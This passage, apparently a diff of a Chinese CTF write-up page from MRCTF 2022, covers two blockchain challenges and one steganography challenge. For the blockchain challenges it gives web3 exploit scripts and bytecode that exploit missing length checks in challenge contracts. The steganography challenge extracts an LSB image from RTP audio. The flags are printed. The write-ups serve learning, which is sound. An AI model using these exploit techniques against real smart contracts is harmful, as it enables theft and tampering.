+<a id="__codelineno-8-7" name="__codelineno-8-7" href="__codelineno-8-7"></a><span class="w">  </span>object<span class="w"> </span><span class="s2">&quot;Runtime&quot;</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-8-8" name="__codelineno-8-8" href="__codelineno-8-8"></a><span class="w">    </span>code<span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-8-9" name="__codelineno-8-9" href="__codelineno-8-9"></a><span class="w">      </span>sstore<span class="p">(</span><span class="m m-Decimal">0</span><span class="p">,</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">)</span><span class="w"></span>
+<a id="__codelineno-8-10" name="__codelineno-8-10" href="__codelineno-8-10"></a><span class="w">      </span>stop<span class="p">()</span><span class="w"></span>
+<a id="__codelineno-8-11" name="__codelineno-8-11" href="__codelineno-8-11"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-8-12" name="__codelineno-8-12" href="__codelineno-8-12"></a><span class="w">  </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-8-13" name="__codelineno-8-13" href="__codelineno-8-13"></a><span class="p">}</span><span class="w"></span>
+</code></pre></div>
+<p>或者手写汇编：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="__codelineno-9-1"></a><span class="c1">; 前面套一层 creationCode</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="__codelineno-9-2"></a><span class="nf">PUSH1</span><span class="w"> </span><span class="mi">0x00</span><span class="w"> </span><span class="c1">; 6000</span>
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="__codelineno-9-3"></a><span class="nf">PUSH1</span><span class="w"> </span><span class="mi">0x00</span><span class="w"> </span><span class="c1">; 6000</span>
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="__codelineno-9-4"></a><span class="nf">SSTORE</span><span class="w">     </span><span class="c1">; 55</span>
+<a id="__codelineno-9-5" name="__codelineno-9-5" href="__codelineno-9-5"></a><span class="nf">STOP</span><span class="w">       </span><span class="c1">; 00</span>
+</code></pre></div>
+<details class="done" open="open">
+<summary>exp</summary>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="__codelineno-10-1"></a><span class="kn">from</span> <span class="nn">web3</span> <span class="kn">import</span> <span class="n">Web3</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="__codelineno-10-2"></a>
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="__codelineno-10-3"></a><span class="n">w3</span> <span class="o">=</span> <span class="n">Web3</span><span class="p">(</span><span class="n">Web3</span><span class="o">.</span><span class="n">HTTPProvider</span><span class="p">(</span><span class="s1">&#39;http://retr0.vip:8545&#39;</span><span class="p">))</span>
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="__codelineno-10-4"></a>
+<a id="__codelineno-10-5" name="__codelineno-10-5" href="__codelineno-10-5"></a><span class="n">hacker</span> <span class="o">=</span> <span class="s1">&#39;...&#39;</span>
+<a id="__codelineno-10-6" name="__codelineno-10-6" href="__codelineno-10-6"></a><span class="n">target</span> <span class="o">=</span> <span class="s1">&#39;...&#39;</span>
+<a id="__codelineno-10-7" name="__codelineno-10-7" href="__codelineno-10-7"></a><span class="n">privateKey</span> <span class="o">=</span> <span class="s1">&#39;...&#39;</span>
+<a id="__codelineno-10-8" name="__codelineno-10-8" href="__codelineno-10-8"></a>
+<a id="__codelineno-10-9" name="__codelineno-10-9" href="__codelineno-10-9"></a><span class="k">def</span> <span class="nf">get_txn</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="n">dst</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">value</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">gas</span><span class="o">=</span><span class="mh">0x200000</span><span class="p">):</span>
+<a id="__codelineno-10-10" name="__codelineno-10-10" href="__codelineno-10-10"></a>    <span class="k">return</span> <span class="p">{</span>
+<a id="__codelineno-10-11" name="__codelineno-10-11" href="__codelineno-10-11"></a>        <span class="s2">&quot;chainId&quot;</span><span class="p">:</span> <span class="mh">0x4bb</span><span class="p">,</span>
+<a id="__codelineno-10-12" name="__codelineno-10-12" href="__codelineno-10-12"></a>        <span class="s2">&quot;from&quot;</span><span class="p">:</span> <span class="n">src</span><span class="p">,</span>
+<a id="__codelineno-10-13" name="__codelineno-10-13" href="__codelineno-10-13"></a>        <span class="s2">&quot;to&quot;</span><span class="p">:</span> <span class="n">dst</span><span class="p">,</span>
+<a id="__codelineno-10-14" name="__codelineno-10-14" href="__codelineno-10-14"></a>        <span class="s2">&quot;gasPrice&quot;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">toWei</span><span class="p">(</span><span class="mf">1.1</span><span class="p">,</span> <span class="s1">&#39;gwei&#39;</span><span class="p">),</span>
+<a id="__codelineno-10-15" name="__codelineno-10-15" href="__codelineno-10-15"></a>        <span class="s2">&quot;gas&quot;</span><span class="p">:</span> <span class="n">gas</span><span class="p">,</span>
+<a id="__codelineno-10-16" name="__codelineno-10-16" href="__codelineno-10-16"></a>        <span class="s2">&quot;value&quot;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">toWei</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="s1">&#39;ether&#39;</span><span class="p">),</span>
+<a id="__codelineno-10-17" name="__codelineno-10-17" href="__codelineno-10-17"></a>        <span class="s2">&quot;nonce&quot;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">getTransactionCount</span><span class="p">(</span><span class="n">src</span><span class="p">),</span>
+<a id="__codelineno-10-18" name="__codelineno-10-18" href="__codelineno-10-18"></a>        <span class="s2">&quot;data&quot;</span><span class="p">:</span> <span class="n">data</span>
+<a id="__codelineno-10-19" name="__codelineno-10-19" href="__codelineno-10-19"></a>    <span class="p">}</span>
+<a id="__codelineno-10-20" name="__codelineno-10-20" href="__codelineno-10-20"></a>
+<a id="__codelineno-10-21" name="__codelineno-10-21" href="__codelineno-10-21"></a><span class="n">data</span> <span class="o">=</span> <span class="n">get_txn</span><span class="p">(</span><span class="n">hacker</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s2">&quot;60006000556006601160003960066000f3600060005500&quot;</span><span class="p">))</span>
+<a id="__codelineno-10-22" name="__codelineno-10-22" href="__codelineno-10-22"></a><span class="n">transaction</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">account</span><span class="o">.</span><span class="n">signTransaction</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">privateKey</span><span class="p">)</span><span class="o">.</span><span class="n">rawTransaction</span>
+<a id="__codelineno-10-23" name="__codelineno-10-23" href="__codelineno-10-23"></a><span class="n">txn_hash</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">sendRawTransaction</span><span class="p">(</span><span class="n">transaction</span><span class="p">)</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
+<a id="__codelineno-10-24" name="__codelineno-10-24" href="__codelineno-10-24"></a><span class="n">txn_receipt</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">waitForTransactionReceipt</span><span class="p">(</span><span class="n">txn_hash</span><span class="p">)</span>
+<a id="__codelineno-10-25" name="__codelineno-10-25" href="__codelineno-10-25"></a><span class="nb">print</span><span class="p">(</span><span class="n">txn_receipt</span><span class="p">)</span>
+<a id="__codelineno-10-26" name="__codelineno-10-26" href="__codelineno-10-26"></a>
+<a id="__codelineno-10-27" name="__codelineno-10-27" href="__codelineno-10-27"></a><span class="n">contractAddress</span> <span class="o">=</span> <span class="n">txn_receipt</span><span class="p">[</span><span class="s1">&#39;contractAddress&#39;</span><span class="p">]</span>
+<a id="__codelineno-10-28" name="__codelineno-10-28" href="__codelineno-10-28"></a>
+<a id="__codelineno-10-29" name="__codelineno-10-29" href="__codelineno-10-29"></a><span class="n">data</span> <span class="o">=</span> <span class="n">get_txn</span><span class="p">(</span><span class="n">hacker</span><span class="p">,</span> <span class="n">target</span><span class="p">,</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s2">&quot;522bb704000000000000000000000000&quot;</span> <span class="o">+</span> <span class="n">contractAddress</span><span class="p">[</span><span class="mi">2</span><span class="p">:]))</span>
+<a id="__codelineno-10-30" name="__codelineno-10-30" href="__codelineno-10-30"></a><span class="n">transaction</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">account</span><span class="o">.</span><span class="n">signTransaction</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">privateKey</span><span class="p">)</span><span class="o">.</span><span class="n">rawTransaction</span>
+<a id="__codelineno-10-31" name="__codelineno-10-31" href="__codelineno-10-31"></a><span class="n">txn_hash</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">sendRawTransaction</span><span class="p">(</span><span class="n">transaction</span><span class="p">)</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
+<a id="__codelineno-10-32" name="__codelineno-10-32" href="__codelineno-10-32"></a><span class="n">txn_receipt</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">waitForTransactionReceipt</span><span class="p">(</span><span class="n">txn_hash</span><span class="p">)</span>
+<a id="__codelineno-10-33" name="__codelineno-10-33" href="__codelineno-10-33"></a><span class="nb">print</span><span class="p">(</span><span class="n">txn_receipt</span><span class="p">)</span>
+</code></pre></div>
+</details>
+<p>flag: <strong>MRCTF{TheShor7testShel1c0dE&amp;EIP-2929}</strong></p>
+<h2 id="jop_gadget">JOP_Gadget<a class="headerlink" href="#jop_gadget" title="Permanent link">&para;</a></h2>
+<p><img alt="" src="https://img.shields.io/badge/-BLOCKCHAIN-orange?style=flat-square" /></p>
+<p>题目的意思就是会先把输入 PUSH2 进去，然后执行，开头会先 JUMP</p>
+<p>看到出题人给的数据解析可以发现没有检查长度</p>
+<p><img alt="Untitled" src="/assets/images/writeups/mrctf2022/Untitled%204.png" /></p>
+<p>所以如果输入的长度并不是 uint16，那么后面的就会被当成正常的字节码来运行，所以只需要在一个 16 位 padding 后面接上正常返回 1 的字节码就可以在运行的时候直接返回 1</p>
+<p>例如 <code>0x123450600160805260206080f300</code> 也就变成了：
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="__codelineno-11-1"></a><span class="nf">PUSH2</span><span class="w"> </span><span class="mi">1234</span><span class="w"></span>
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="__codelineno-11-2"></a><span class="nf">POP</span><span class="w"></span>
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="__codelineno-11-3"></a><span class="nf">PUSH1</span><span class="w"> </span><span class="mi">0x01</span><span class="w"></span>
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="__codelineno-11-4"></a><span class="nf">PUSH1</span><span class="w"> </span><span class="mi">0x80</span><span class="w"></span>
+<a id="__codelineno-11-5" name="__codelineno-11-5" href="__codelineno-11-5"></a><span class="nf">MSTORE</span><span class="w"></span>
+<a id="__codelineno-11-6" name="__codelineno-11-6" href="__codelineno-11-6"></a><span class="nf">PUSH1</span><span class="w"> </span><span class="mi">0x20</span><span class="w"></span>
+<a id="__codelineno-11-7" name="__codelineno-11-7" href="__codelineno-11-7"></a><span class="nf">PUSH1</span><span class="w"> </span><span class="mi">0x80</span><span class="w"></span>
+<a id="__codelineno-11-8" name="__codelineno-11-8" href="__codelineno-11-8"></a><span class="nf">RETURN</span><span class="w"></span>
+<a id="__codelineno-11-9" name="__codelineno-11-9" href="__codelineno-11-9"></a><span class="nf">STOP</span><span class="w"></span>
+</code></pre></div></p>
+<p>flag: <strong>MRCTF{You_4r3_7hE_master_0f_F1nD1ng_G4g3t_0r_t73_K1ng_07_the_vuln_guesser&amp;F0under}</strong></p>
+<hr />
+<h2 id="bleach">Bleach!<a class="headerlink" href="#bleach" title="Permanent link">&para;</a></h2>
+<p><img alt="" src="https://img.shields.io/badge/-MISC-informational?style=flat-square" /></p>
+<blockquote>
+<p>赛后补做的题</p>
+</blockquote>
+<p>流量分析看到一堆 UDP 协议和 OICQ 协议</p>
+<p>在赛后看了 nano 的 wp 后知道那一大堆 UDP 是在 UDP 基础上的 RTP 协议，要在 wireshark 里 decode as RTP 才能显示为 RTP 流</p>
+<p>然后通过 wireshark 的 RTP 流播放器导出音频 raw 文件，在 Au 中打开，根据题目描述的提示，应该是 44100Hz、16 位 PCM 编码，打开后可以听到清晰歌曲声音</p>
+<p>再由题目描述中的 picture in music 想到 lsb，以及 400*400 的图片大小。所以存为 wav 后读取，提取 lsb 转为图片</p>
+<p>因为存下来的 wav 是 16 位整数，所以每一帧视为两个 8 位整数，分别提取 lsb，一共需要 400*400/2 帧：</p>
+<details class="done" open="open">
+<summary>exp</summary>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="__codelineno-12-1"></a><span class="kn">import</span> <span class="nn">wave</span>
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="__codelineno-12-2"></a><span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span>
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="__codelineno-12-3"></a>
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="__codelineno-12-4"></a><span class="n">f</span> <span class="o">=</span> <span class="n">wave</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&quot;bleach.wav&quot;</span><span class="p">,</span> <span class="s2">&quot;rb&quot;</span><span class="p">)</span>
+<a id="__codelineno-12-5" name="__codelineno-12-5" href="__codelineno-12-5"></a>
+<a id="__codelineno-12-6" name="__codelineno-12-6" href="__codelineno-12-6"></a><span class="n">frames</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readframes</span><span class="p">(</span><span class="mi">400</span><span class="o">*</span><span class="mi">400</span><span class="o">//</span><span class="mi">2</span><span class="p">)</span>
+<a id="__codelineno-12-7" name="__codelineno-12-7" href="__codelineno-12-7"></a><span class="n">res</span> <span class="o">=</span> <span class="p">[</span><span class="mi">255</span> <span class="k">if</span> <span class="n">frame</span> <span class="o">&amp;</span> <span class="mi">1</span> <span class="k">else</span> <span class="mi">0</span> <span class="k">for</span> <span class="n">frame</span> <span class="ow">in</span> <span class="n">frames</span><span class="p">]</span>
+<a id="__codelineno-12-8" name="__codelineno-12-8" href="__codelineno-12-8"></a>
+<a id="__codelineno-12-9" name="__codelineno-12-9" href="__codelineno-12-9"></a><span class="n">img</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s2">&quot;L&quot;</span><span class="p">,</span> <span class="p">(</span><span class="mi">400</span><span class="p">,</span> <span class="mi">400</span><span class="p">))</span>
+<a id="__codelineno-12-10" name="__codelineno-12-10" href="__codelineno-12-10"></a><span class="n">k</span> <span class="o">=</span> <span class="mi">0</span>
+<a id="__codelineno-12-11" name="__codelineno-12-11" href="__codelineno-12-11"></a><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">400</span><span class="p">):</span>
+<a id="__codelineno-12-12" name="__codelineno-12-12" href="__codelineno-12-12"></a>    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">400</span><span class="p">):</span>
+<a id="__codelineno-12-13" name="__codelineno-12-13" href="__codelineno-12-13"></a>        <span class="n">img</span><span class="o">.</span><span class="n">putpixel</span><span class="p">((</span><span class="n">j</span><span class="p">,</span> <span class="n">i</span><span class="p">),</span> <span class="n">res</span><span class="p">[</span><span class="n">k</span><span class="p">])</span>
+<a id="__codelineno-12-14" name="__codelineno-12-14" href="__codelineno-12-14"></a>        <span class="n">k</span> <span class="o">+=</span> <span class="mi">1</span>
+<a id="__codelineno-12-15" name="__codelineno-12-15" href="__codelineno-12-15"></a><span class="n">img</span><span class="o">.</span><span class="n">show</span><span class="p">()</span>
+<a id="__codelineno-12-16" name="__codelineno-12-16" href="__codelineno-12-16"></a><span class="n">img</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="s2">&quot;flag.png&quot;</span><span class="p">)</span>
+</code></pre></div>
+</details>
+<p><img alt="" src="/assets/images/writeups/mrctf2022/bleach.png" /></p>
+<p>flag: <strong>MRCTF{Don’t_Use_Your_tools!}</strong></p>
+
+  
+    <hr>
+<div class="md-source-file">
+  <small>
+    
+      最后更新:
+      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2022年4月26日 11:27:12</span>
+      
+        <br>
+        创建日期:
+        <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2022年4月26日 11:27:12</span>
+      
+    
+  </small>
+</div>
+  
+
+                
+              </article>
+            </div>
+          </div>
+          
+            <a href="#" class="md-top md-icon" data-md-component="top" data-md-state="hidden">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"/></svg>
+              回到页面顶部
+            </a>
+          
+        </main>
+        
+          <footer class="md-footer">
+  
+    <nav class="md-footer__inner md-grid" aria-label="页脚">
+      
+        
+        <a href="../%2Actf2022/" class="md-footer__link md-footer__link--prev" aria-label="上一页: *CTF 2022" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                上一页
+              </span>
+              *CTF 2022
+            </div>
+          </div>
+        </a>
+      
+      
+        
+        <a href="../../misc/" class="md-footer__link md-footer__link--next" aria-label="下一页: 杂七杂八的东西" rel="next">
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                下一页
+              </span>
+              杂七杂八的东西
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2022 <a href="https://github.com/TonyCrane"  target="_blank" rel="noopener">TonyCrane</a>
+    </div>
+  
+  
+    Powered by
+    <a href="https://www.mkdocs.org/" target="_blank" rel="noopener">
+      MkDocs
+    </a>
+    with theme
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material
+    </a>
+    modified by
+    <a href="https://github.com/TonyCrane" target="_blank" rel="noopener">
+      TonyCrane
+    </a>
+  
+</div>
+  
+      
+        <div class="md-social">
+  
+    
+    
+      
+      
+    
+    <a href="https://github.com/TonyCrane/" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+    </a>
+  
+    
+    
+      
+      
+    
+    <a href="https://blog.tonycrane.cc/" target="_blank" rel="noopener" title="blog.tonycrane.cc" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M128.081 415.959c0 35.369-28.672 64.041-64.041 64.041S0 451.328 0 415.959s28.672-64.041 64.041-64.041 64.04 28.673 64.04 64.041zm175.66 47.25c-8.354-154.6-132.185-278.587-286.95-286.95C7.656 175.765 0 183.105 0 192.253v48.069c0 8.415 6.49 15.472 14.887 16.018 111.832 7.284 201.473 96.702 208.772 208.772.547 8.397 7.604 14.887 16.018 14.887h48.069c9.149.001 16.489-7.655 15.995-16.79zm144.249.288C439.596 229.677 251.465 40.445 16.503 32.01 7.473 31.686 0 38.981 0 48.016v48.068c0 8.625 6.835 15.645 15.453 15.999 191.179 7.839 344.627 161.316 352.465 352.465.353 8.618 7.373 15.453 15.999 15.453h48.068c9.034-.001 16.329-7.474 16.005-16.504z"/></svg>
+    </a>
+  
+    
+    
+      
+      
+    
+    <a href="https://tonycrane.cc/" target="_blank" rel="noopener" title="tonycrane.cc" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path d="M280.37 148.26 96 300.11V464a16 16 0 0 0 16 16l112.06-.29a16 16 0 0 0 15.92-16V368a16 16 0 0 1 16-16h64a16 16 0 0 1 16 16v95.64a16 16 0 0 0 16 16.05L464 480a16 16 0 0 0 16-16V300L295.67 148.26a12.19 12.19 0 0 0-15.3 0zM571.6 251.47 488 182.56V44.05a12 12 0 0 0-12-12h-56a12 12 0 0 0-12 12v72.61L318.47 43a48 48 0 0 0-61 0L4.34 251.47a12 12 0 0 0-1.6 16.9l25.5 31A12 12 0 0 0 45.15 301l235.22-193.74a12.19 12.19 0 0 1 15.3 0L530.9 301a12 12 0 0 0 16.9-1.6l25.5-31a12 12 0 0 0-1.7-16.93z"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+        
+      </div>
+      <div class="md-dialog" data-md-component="dialog">
+        <div class="md-dialog__inner md-typeset"></div>
+      </div>
+      <script id="__config" type="application/json">{"base": "../..", "features": ["content.code.annotate", "navigation.tracking", "navigation.tabs", "navigation.indexes", "navigation.top"], "translations": {"clipboard.copy": "\u590d\u5236", "clipboard.copied": "\u5df2\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.term.missing": "\u7f3a\u5c11", "select.version.title": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "search": "../../assets/javascripts/workers/search.361d90f1.min.js"}</script>
+      
+      
+        <script src="../../assets/javascripts/bundle.289a2a4b.min.js"></script>
+        
+          <script src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.js"></script>
+        
+          <script src="../../js/katex.js"></script>
+        
+      
+    </body>
+  </html>
+  
